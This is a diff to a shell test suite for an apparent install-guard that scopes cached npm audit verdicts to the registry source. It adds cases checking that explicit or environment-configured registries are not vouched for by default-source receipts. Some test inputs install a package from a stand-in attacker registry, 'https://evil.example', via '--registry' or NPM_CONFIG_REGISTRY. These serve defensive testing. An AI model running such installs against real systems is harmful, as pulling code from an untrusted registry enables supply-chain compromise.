@@ -1241,10 +1241,11 @@ case_pip_cumulative_sources_all_reach_audit() {
 case_stale_evidence_is_source_scoped() {
   prepare_case "stale-evidence-source-scoped"
   mkdir -p "${HOME_DIR}/.config/safe/run"
-  printf '{"packages": {"npm:okpkg": {"version": "1.0.0", "verdict": "GO", "reasons": [], "evidence": "x", "source": "default", "first_allowed": "%s", "last_used": "2026-07-31", "times_used": 1}}}\n' \
+  printf '{"packages": {"npm:okpkg": {"version": "1.0.0", "verdict": "GO", "reasons": [], "evidence": "x", "source": "implicit-default", "first_allowed": "%s", "last_used": "2026-07-31", "times_used": 1}}}\n' \
     "$(date -Iseconds)" > "${HOME_DIR}/.config/safe/run/install-known.json"
 
-  # Same source (default): the fresh GO receipt may carry an audit timeout.
+  # Same source (implicit default): the fresh GO receipt may carry an audit
+  # timeout.
   SAFE_AUDIT_CHECK_STATUS=124 SAFE_INSTALL_TEST_SCRIPT='npm install -g okpkg@1.0.0' run_zsh
   assert_status 0 "$FUNCNAME" || return
   assert_log_contains $'REAL\tnpm\tinstall\t-g\tokpkg@1.0.0' "$FUNCNAME" || return
@@ -1256,6 +1257,29 @@ case_stale_evidence_is_source_scoped() {
   SAFE_AUDIT_CHECK_STATUS=124 SAFE_INSTALL_TEST_SCRIPT='npm install -g --registry https://evil.example okpkg@1.0.0' run_zsh
   assert_status 100 "$FUNCNAME" || return
   assert_log_not_contains_fragment $'REAL\tnpm' "$FUNCNAME" || return
+
+  # A literal selector spelled "default" is an EXPLICIT source: it must not
+  # collide with the implicit-default sentinel (delta-3 finding 5).
+  : > "${LOG_FILE}"
+  SAFE_AUDIT_CHECK_STATUS=124 SAFE_INSTALL_TEST_SCRIPT='npm install -g --registry default okpkg@1.0.0' run_zsh
+  assert_status 100 "$FUNCNAME" || return
+  assert_log_not_contains_fragment $'REAL\tnpm' "$FUNCNAME" || return
+
+  # An env-configured registry is part of the effective source even with no
+  # argv selector: implicit-default evidence must not vouch for it (delta-3
+  # finding 3.2).
+  : > "${LOG_FILE}"
+  SAFE_AUDIT_CHECK_STATUS=124 SAFE_INSTALL_TEST_SCRIPT='NPM_CONFIG_REGISTRY=https://evil.example npm install -g okpkg@1.0.0' run_zsh
+  assert_status 100 "$FUNCNAME" || return
+  assert_log_not_contains_fragment $'REAL\tnpm' "$FUNCNAME" || return
+
+  # Legacy source-less receipts map to implicit default only.
+  printf '{"packages": {"npm:okpkg": {"version": "1.0.0", "verdict": "GO", "reasons": [], "evidence": "x", "first_allowed": "%s", "last_used": "2026-07-31", "times_used": 1}}}\n' \
+    "$(date -Iseconds)" > "${HOME_DIR}/.config/safe/run/install-known.json"
+  : > "${LOG_FILE}"
+  SAFE_AUDIT_CHECK_STATUS=124 SAFE_INSTALL_TEST_SCRIPT='npm install -g okpkg@1.0.0' run_zsh
+  assert_status 0 "$FUNCNAME" || return
+  assert_log_contains $'REAL\tnpm\tinstall\t-g\tokpkg@1.0.0' "$FUNCNAME" || return
   pass "$FUNCNAME"
 }
 
